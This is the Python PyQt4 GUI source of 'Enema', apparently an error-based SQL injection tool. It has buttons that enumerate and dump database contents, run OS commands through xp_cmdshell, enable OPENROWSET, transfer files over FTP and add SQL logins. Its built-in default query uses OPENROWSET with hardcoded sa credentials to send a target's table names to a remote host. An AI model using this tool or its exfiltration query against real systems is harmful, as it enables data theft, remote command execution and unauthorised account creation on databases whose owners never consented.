"""
    Enema - GUI events
    Copyright (C) 2011  Valeriy Bogachuk

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import txtproc
from injection import ErrorBased
from PyQt4 import QtCore, QtGui 
from Ui_form import Ui_MainForm
from Ui_encoder_form import Ui_EncoderForm
from Ui_about_form import Ui_AboutForm


class EncoderForm(QtGui.QWidget):
    
    
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)
        self.ui = Ui_EncoderForm()
        self.ui.setupUi(self)
        
#==================================SIGNALS=BLOCK======================================#
        self.ui.encodeButton.clicked.connect(self.encodeButton_OnClick)
        self.ui.radioChar.toggled.connect(self.radioChanged)
        self.ui.comboBox.currentIndexChanged.connect(self.comboChanged)
        
#Encode button click
    def encodeButton_OnClick(self):
        if self.ui.radioHex.isChecked():
            self.ui.textResult.setText(txtproc.strToHex(self.ui.lineString.text()))
        else:
            if self.ui.comboBox.currentText() == "MySQL":
                encResult = txtproc.strToSqlChar(self.ui.lineString.text(), "mysql")
            else:
                encResult = txtproc.strToSqlChar(self.ui.lineString.text(), "mssql")
                if self.ui.isUrlencoded.isChecked():
                    encResult = encResult.replace("+",  "%2b")
            self.ui.textResult.setText(encResult)
 
#ComboBox changed:
    def comboChanged(self):
        if self.ui.comboBox.currentText() == "MySQL":
            self.ui.isUrlencoded.setEnabled(False)
        else:
            self.ui.isUrlencoded.setEnabled(True)

#Char radio selected
    def radioChanged(self) :
        if (self.ui.radioChar.isChecked() and self.ui.comboBox.currentText() == "MSSQL"):
            self.ui.isUrlencoded.setEnabled(True)
        else:
            self.ui.isUrlencoded.setEnabled(False)


class AboutForm(QtGui.QWidget):
    
    
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)
        self.ui = Ui_AboutForm()
        self.ui.setupUi(self)
        
        
class EnemaForm(QtGui.QMainWindow):
    
    
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)
        self.ui = Ui_MainForm()
        self.ui.setupUi(self)
        
        self.ui.progressBar.hide()
        self.ui.progressBarCmd.hide()
        self.ui.progressBarDump.hide()
        
        self.ui.queryText.setText(\
        "insert into OPENROWSET('SQLoledb','uid=sa;pwd=49194919;" \
        "database=trash;Address=192.168.1.1,21;','select result from tmp')" \
        " select table_name from information_schema.tables;")
        
#==================================SIGNALS=BLOCK======================================# 
#DB_STRUCTURE-TAB ------------
        self.ui.getBasesButton.clicked.connect(self.getBasesButton_OnClick)
        self.ui.tablesButton.clicked.connect(self.tablesButton_OnClick)
        self.ui.countButton.clicked.connect(self.countButton_OnClick)
        self.ui.getColumnsButton.clicked.connect(self.getColumnsButton_OnClick)
        self.ui.cleanThreeButton.clicked.connect(self.cleanThreeButton_OnClick)
#DUMP-TAB----------------------
        self.ui.dmpButton.clicked.connect(self.dmpButton_OnClick)
#XP_CMDSHELL-TAB ----------
        self.ui.lineCmd.returnPressed.connect(self.lineCmd_OnPressEnter)
        self.ui.clearCmdButton.clicked.connect(self.clearCmdButton_OnClick)
        self.ui.enableXpcmdButton.clicked.connect(self.enableXpcmdButton_OnClick)
#upload / query ------------
        self.ui.ftpButton.clicked.connect(self.ftpButton_OnClick)
        self.ui.queryButton.clicked.connect(self.queryButton_OnClick)
        self.ui.addUserButton.clicked.connect(self.addUserButton_OnClick)
        self.ui.openRowSetButton.clicked.connect(self.openRowSetButton_OnClick)
#Save Menu-----------------  
        self.ui.saveTables.triggered.connect(self.saveTables_OnClick)
        self.ui.saveColumns.triggered.connect(self.saveColumns_OnClick)
        self.ui.saveBases.triggered.connect(self.saveBases_OnClick)
        self.ui.csvExport.triggered.connect(self.csvExport_OnClick)
#Load Menu-----------------
        self.ui.loadTables.triggered.connect(self.loadTables_OnClick)
        self.ui.loadBases.triggered.connect(self.loadBases_OnClick)
#Tools Menu----------------
        self.ui.menuEncoder.triggered.connect(self.menuEncoder_OnClick)
#Help menu-----------------
        self.ui.menuAbout.triggered.connect(self.menuAbout_OnClick)
#Db Type change-----------
        self.ui.comboBox_3.currentIndexChanged.connect(self.dbTypeChanged)
#========================================END==============================================#
########################################################
#===============================GENERAL-FUNCTIONS=====================================#
#Get user defined parametes from GUI
    def webData(self):
        if not self.ui.listOfTables.currentItem():
            currTable = ""
        else:
            currTable = self.ui.listOfTables.currentItem().text()
        wD = {
              'url' : self.ui.lineUrl.text(), 
              'method' : self.getMethod() , 
              'errGenerationMethodMSSQL' : self.getErrGenerationMethodMSSQL(),
              'mp' : self.ui.lineMP.text(), 
              'ms' : self.ui.lineMS.text(), 
              'threads' : int(self.ui.threadBox.value()), 
              'timeOut' : int(self.ui.lineTimeout.text()), 
              'dbListCount' : self.ui.dbListComboBox.count(),
              'dbName' : str(self.ui.dbListComboBox.currentText()), 
              'notInArray' : self.ui.radioNotInArray.isChecked(),
              'notInSubstring' : self.ui.radioNotInSubstring.isChecked(),
              'ordinal_position' : self.ui.radioOrdinalPosition.isChecked(), 
              'selected_table' : currTable, 
              'tblTreeCount' : self.ui.treeOfTables.topLevelItemCount(), 
              'login' : self.ui.lineFtpLogin.text(), 
              'password' : self.ui.lineFtpPwd.text(), 
              'ftpFiles': self.ui.lineFtpFile.text().split(";"), 
              'filePath' : self.ui.lineFtpPath.text(), 
              'ip' : self.ui.lineIP.text(), 
              'cmd' : self.ui.lineCmd.text(), 
              'query_cmd' : self.ui.queryText.toPlainText(), 
              'querySelect' : self.ui.radioSelect.isChecked(), 
              'addUserLogin' : self.ui.lineAddUserLogin.text(), 
              'addUserPassword' : self.ui.lineAddUserPwd.text(), 
              'data' : self.ui.textEdit.toPlainText(), 
              'cookie' :  self.ui.lineCookie.text(), 
              'db_type' : self.getDbType(), 
              'table' : self.ui.lineTable.text(), 
              'key' : self.ui.lineKey.text(), 
              'columns' : self.ui.lineColumns.text().split(";"), 
              'fromPos' : int(self.ui.lineFrom.text()), 
              'toPos' :  int(self.ui.lineTo.text())}
        return wD
            
#Db type changed event:
    def dbTypeChanged(self):
        if self.getDbType() == "mysql":
            self.ui.radioNotInSubstring.setText("LIMIT")
            self.ui.radioNotInSubstring.setChecked(True)
            self.ui.radioNotInArray.hide()
            self.ui.tab_2.setEnabled(False)
            self.ui.groupBox_2.setEnabled(False)
            self.ui.groupBox_5.setEnabled(False)
            self.ui.openRowSetButton.setEnabled(False)
            self.ui.comboBox_2.hide()
            self.ui.tabWidget.setTabEnabled(1, False)
            self.ui.tabWidget.setTabEnabled(3, False)
        else:
            self.ui.tabWidget.setTabEnabled(1, True)
            self.ui.tabWidget.setTabEnabled(3, True)
            self.ui.radioNotInSubstring.setText("not in(substring)")
            self.ui.radioNotInArray.show()
            self.ui.radioNotInArray.setChecked(True)
            self.ui.tab_2.setEnabled(True)
            self.ui.groupBox_2.setEnabled(True)
            self.ui.groupBox_5.setEnabled(True)
            self.ui.openRowSetButton.setEnabled(True)
            self.ui.comboBox_2.show()
        
#========================================END==============================================#
########################################################
#================================MENU=SAVE=BLOCK======================================#
#Click on menu save tables
    def saveTables_OnClick(self):
        filePath = QtGui.QFileDialog.getSaveFileName(self, "Save tables",
                                                     QtCore.QDir.homePath(),
                                                     ("Text files (*.txt)"))
        self.writeToFile(filePath, "tables")
        
#Click on menu save columns 
    def saveColumns_OnClick(self):
        filePath = QtGui.QFileDialog.getSaveFileName(self, "Save columns", 
                                                     QtCore.QDir.homePath(),
                                                     ("Text files (*.txt)"))
        self.writeToFile(filePath, "columns")
        
#Click on menu save bases  
    def saveBases_OnClick(self):
        filePath = QtGui.QFileDialog.getSaveFileName(self, "Save bases",
                                                     QtCore.QDir.homePath(),
                                                     ("Text files (*.txt)"))
        self.writeToFile(filePath, "bases")

#Click on menu csv export
    def csvExport_OnClick(self):
        filePath = QtGui.QFileDialog.getSaveFileName(self, "Export to csv",
                                                     QtCore.QDir.homePath(),
                                                     ("CSV Files (*.csv)"))
        self.writeToFile(filePath,  "csv")

#Write data to file   
    def writeToFile(self, filePath, save):
        try:
            file = open(filePath, "w")
            if save == "tables":
                for i in range(self.ui.listOfTables.count()):
                    file.write(self.ui.listOfTables.item(i).text() + "\n")
            elif save == "columns":
                for i in range (self.ui.treeOfTables.topLevelItemCount()):
                    file.write("---[" + self.ui.treeOfTables.topLevelItem(i).text(0) + "]---")
                    for num in range(self.ui.treeOfTables.topLevelItem(i).childCount()):
                        file.write("\n" + self.ui.treeOfTables.topLevelItem(i).child(num).text(0))
                    file.write("\n\n")
            elif save == "bases":
                for i in range(self.ui.dbListComboBox.count()):
                    db_name = self.ui.dbListComboBox.itemText(i)
                    file.write(db_name + "\n")
            else:
                for r in range(self.ui.tableWidget.rowCount()):
                    for c in range(self.ui.tableWidget.columnCount()):
                        file.write(self.ui.tableWidget.item(r, c).text()+ "\n")
            file.close()
        except Exception:
            return
#=========================================END=============================================#
########################################################
#================================MENU=LOAD=BLOCK======================================#
#Click on menu load tables
    def loadTables_OnClick(self):
        filePath = QtGui.QFileDialog.getOpenFileName(self, "Load tables", 
                                                     QtCore.QDir.homePath(),
                                                     ("Text files (*.txt)"))
        self.readFromFile(filePath, "tables")
        
#Click on menu load bases  
    def loadBases_OnClick(self):
        filePath = QtGui.QFileDialog.getOpenFileName(self, "Load bases", 
                                                     QtCore.QDir.homePath(),
                                                     ("Text files (*.txt)"))
        self.readFromFile(filePath, "bases")
        
#Read data from file
    def readFromFile(self, filePath, load):
        try:
            file = open(filePath, "r")
            buff = file.read()
            buff = buff.split()
            if load == "tables":
                self.ui.listOfTables.clear()
                for line in buff:
                    self.ui.listOfTables.addItem(line)
            else:
                self.ui.dbListComboBox.clear()
                for line in buff:
                    self.ui.dbListComboBox.addItem(line)
            file.close()
        except Exception:
            return
#========================================END==========================================#
######################################################
#================================MENU=TOOLS=BLOCK=================================#
    def menuEncoder_OnClick(self):
        self.enc_frm = EncoderForm()
        self.enc_frm.show()
#========================================END==========================================#
######################################################
#================================MENU=ABOUT=BLOCK=================================#
    def menuAbout_OnClick(self):
        self.about_frm = AboutForm()
        self.about_frm.show()
#========================================END==========================================#
######################################################
#=================================DB/TABLES=BLOCK==================================#
#Getting request method
    def getMethod(self):
        if str(self.ui.comboBox.currentText()) == "POST":
            return "POST"
        else:
            return "GET"

#Getting request method
    def getErrGenerationMethodMSSQL(self):
        if str(self.ui.comboBox_2.currentText()) == "CONVERT":
            return "CONVERT"
        else:
            return "CAST"
 
#Getting request method
    def getDbType(self):
        if str(self.ui.comboBox_3.currentText()) == "MSSQL":
            return "mssql"
        else:
            return "mysql"
            
#[...] button click
    def getBasesButton_OnClick(self):
        wD = self.webData()
        wD['task'] = "bases"
        if self.ui.radioOrdinalPosition.isChecked():
            self.showInfoMsg("ordinal_position method valid only for columns.")
            return
        if self.ui.dbListComboBox.count() < 1:
            wD['dbName'] = ""
        elif self.ui.dbListComboBox.count() > 1:
            self.ui.dbListComboBox.clear()
            wD['dbName'] = ""
        else:
            wD['dbName'] = ",'" + str(self.ui.dbListComboBox.currentText()) + "'"
        self.ui.progressBar.setValue(0)
        self.ui.progressBar.show()
        self.t = ErrorBased(wD)
        self.t.dbSignal.connect(self.addBase, type=QtCore.Qt.QueuedConnection)
        self.t.progressSignal.connect(self.updatePb, type=QtCore.Qt.QueuedConnection)
        self.t.start()
                
#Updating main progressBar
    @QtCore.pyqtSlot(int, bool, bool)
    def updatePb(self, pbMax, setZero, hidePb):
        if hidePb:
            self.ui.progressBar.hide()
            return
        if setZero:
            self.ui.progressBar.setValue(0)
            return
        self.ui.progressBar.setMaximum(pbMax)
        self.ui.progressBar.setValue(self.ui.progressBar.value() + 1)
        
#Get Tables button click      
    def tablesButton_OnClick(self):
        wD = self.webData()
        wD['task'] = 'tables'
        if self.ui.radioOrdinalPosition.isChecked():
            self.showInfoMsg("ordinal_position method valid only for columns.")
            return
        self.ui.listOfTables.clear()
        self.ui.totalLabel.setText("0")
        self.ui.progressBar.setValue(0)
        self.ui.progressBar.show()
        self.t = ErrorBased(wD)
        self.t.dbSignal.connect(self.addBase, type=QtCore.Qt.QueuedConnection)
        self.t.tblCountSignal.connect(self.setTblCount)
        self.t.tblSignal.connect(self.addTable, type=QtCore.Qt.QueuedConnection)
        self.t.progressSignal.connect(self.updatePb, type=QtCore.Qt.QueuedConnection)
        self.t.start()
        
#Add db to listBox
    @QtCore.pyqtSlot(str)
    def addBase(self, db_name):
        self.ui.dbListComboBox.addItem(db_name)

#Set label value to count of tables in current db
    @QtCore.pyqtSlot(str)
    def setTblCount(self, tblCount):
        self.ui.totalLabel.setText(tblCount)

#Add table to ListWidget
    @QtCore.pyqtSlot(str)
    def addTable(self, table_name):
        self.ui.listOfTables.addItem(table_name)
            
#Count button click
    def countButton_OnClick(self):
        wD = self.webData()
        wD['task'] = 'count'
        if not self.ui.listOfTables.currentItem():
            return
        self.t = ErrorBased(wD)
        self.t.msgSignal.connect(self.showInfoMsg)
        self.t.dbSignal.connect(self.addBase, type=QtCore.Qt.QueuedConnection)
        self.t.start()
        
#Show Informational MessageBox:
    @QtCore.pyqtSlot(str)
    def showInfoMsg(self, msg):
        QtGui.QMessageBox.information(self, "Enema", msg, 1, 0)
#======================================END==============================================#
#######################################################
#==============================COLUMNS=BLOCK=========================================#    
#Get columns button click       
    def getColumnsButton_OnClick(self):
        wD = self.webData()
        wD['task'] = 'columns'
        if self.ui.treeOfTables.topLevelItemCount() < 1:
            return
        self.ui.progressBar.setValue(0)
        self.ui.progressBar.show()
        tables = []
        for table in range(self.ui.treeOfTables.topLevelItemCount()):
            tables.append(self.ui.treeOfTables.topLevelItem(table).text(0))
        wD['tables'] = tables
        self.t = ErrorBased(wD)
        self.t.dbSignal.connect(self.addBase, type=QtCore.Qt.QueuedConnection)
        self.t.columnSignal.connect(self.addColumn)
        self.t.progressSignal.connect(self.updatePb)
        self.t.start()
                
#Adding columns to TreeWidget
    @QtCore.pyqtSlot(str, int)
    def addColumn(self, column_name, i):
        column = QtGui.QTreeWidgetItem()
        column.setText(0, column_name)
        self.ui.treeOfTables.topLevelItem(i).addChild(column)
    
#Clear button click
    def cleanThreeButton_OnClick(self):
        self.ui.treeOfTables.clear()
#=======================================END===============================================#
########################################################
#==================================DUMP-BLOCK===========================================# 
#GO button click        
    def dmpButton_OnClick(self):
        wD = self.webData()
        wD['task'] = 'dump'
        self.ui.tabWidget.setTabEnabled(0, False)
        self.ui.tabWidget.setTabEnabled(2, False)
        self.ui.tabWidget.setTabEnabled(3, False)
        self.ui.tableWidget.clear()
        #Building table
        self.ui.tableWidget.setColumnCount(len(wD['columns']))
        self.ui.tableWidget.setHorizontalHeaderLabels(wD['columns'])
        self.ui.tableWidget.setRowCount(wD['toPos'] - wD['fromPos'])
        self.ui.progressBarDump.setValue(0)
        self.ui.progressBarDump.show()
        self.ui.progressBarDump.setMaximum(self.ui.tableWidget.rowCount() * len(wD['columns']))
        self.t = ErrorBased(wD)
        self.t.rowDataSignal.connect(self.addRowData, type=QtCore.Qt.QueuedConnection)
        self.t.progressSignal.connect(self.updatePbDump, type=QtCore.Qt.QueuedConnection)
        self.t.start()          

#Updating Dump progressBar
    @QtCore.pyqtSlot(int, bool, bool)
    def updatePbDump(self, pbMax, setZero, hidePb):
        if hidePb:
            self.ui.progressBarDump.hide()
            self.ui.tabWidget.setTabEnabled(0, True)
            self.ui.tabWidget.setTabEnabled(2, True)
            self.ui.tabWidget.setTabEnabled(3, True)
            return
        if setZero:
            self.ui.progressBarDump.setValue(0)
            return
        self.ui.progressBarDump.setValue(self.ui.progressBarDump.value() + 1)
        
#Add row data
    @QtCore.pyqtSlot(int, int, str)
    def addRowData(self,  tNum, num,  rowData):
        rData = QtGui.QTableWidgetItem()
        rData.setText(rowData)
        self.ui.tableWidget.setItem((tNum - int(self.ui.lineFrom.text()) - 1), num, rData)

#Update current position:

    @QtCore.pyqtSlot(str)
    def addPosition(self, position):
        self.ui.label_23.setText(position)
    
#=======================================END===============================================#
########################################################
#=============================XP_CMDSHELL=BLOCK=======================================# 
#Press Enter in lineCmd
    def lineCmd_OnPressEnter(self):
        wD = self.webData()
        wD['task'] = "cmd"
        self.ui.lineCmd.clear()
        self.ui.progressBar.setValue(0)
        self.ui.progressBarCmd.show()
        self.t = ErrorBased(wD)
        self.t.cmdSignal.connect(self.cmdOutputAppend)
        self.t.progressSignal.connect(self.updatePbCmd)
        self.t.start()

#Updating CMD progressBar
    @QtCore.pyqtSlot(int, bool, bool)
    def updatePbCmd(self, pbMax, setZero, hidePb):
        if hidePb:
            self.ui.progressBarCmd.hide()
            return
        if setZero:
            self.ui.progressBarCmd.setValue(0)
            return
        self.ui.progressBarCmd.setMaximum(pbMax)
        self.ui.progressBarCmd.setValue(self.ui.progressBarCmd.value() + 1)
        
#Add text to textOutput
    @QtCore.pyqtSlot(str, bool)
    def cmdOutputAppend(self, string, isLine):
        if isLine:
            self.ui.textCmdOutput.append("\n---------------------------------------")
        self.ui.textCmdOutput.append(string)
        scrollBar = self.ui.textCmdOutput.verticalScrollBar()
        scrollBar.setValue(scrollBar.maximum())

#Enable xp_cmdshell button click    
    def enableXpcmdButton_OnClick(self):
        wD = self.webData()
        wD['task'] = "enable_cmd"
        self.t = ErrorBased(wD)
        self.t.msgSignal.connect(self.showInfoMsg)
        self.t.start()
        
#Clear xp_cmdshell output
    def clearCmdButton_OnClick(self):
        self.ui.textCmdOutput.clear()
#========================================END==========================================#
######################################################
#==============================UPLOAD/QUERY=BLOCK=================================#
#FTP Upload button click        
    def ftpButton_OnClick(self):
        wD = self.webData()
        wD['task'] = "ftp"
        if self.ui.radioGet.isChecked():
            wD['ftp_mode'] = 'get'
        else:
            wD['ftp_mode'] = 'send'
        self.t = ErrorBased(wD)
        self.t.start()   
 
#Query button click    
    def queryButton_OnClick(self):
        wD = self.webData()
        wD['task'] = "query"
        self.t = ErrorBased(wD)
        self.t.querySignal.connect(self.queryResult)
        self.t.start()

#Set query result
    @QtCore.pyqtSlot(str)
    def queryResult(self, result):
        self.ui.queryOutput.setText(result)
        
#Enable OPENROWSET button click    
    def openRowSetButton_OnClick(self):
        wD = self.webData()
        wD['task'] = "enable_openrowset"
        self.t = ErrorBased(wD)
        self.t.msgSignal.connect(self.showInfoMsg)
        self.t.start()
        
#Add user button click 
    def addUserButton_OnClick(self):
        wD = self.webData()
        wD['task'] = "addSqlUser"
        self.t = ErrorBased(wD)
        self.t.msgSignal.connect(self.showInfoMsg)
        self.t.start()
#========================================END==========================================#
######################################################
#--------------------------------------------------------------------------------------------------------#
if __name__ == "__main__":
    import sys
    app = QtGui.QApplication(sys.argv)
    mform = EnemaForm()
    mform.show()
    sys.exit(app.exec_())
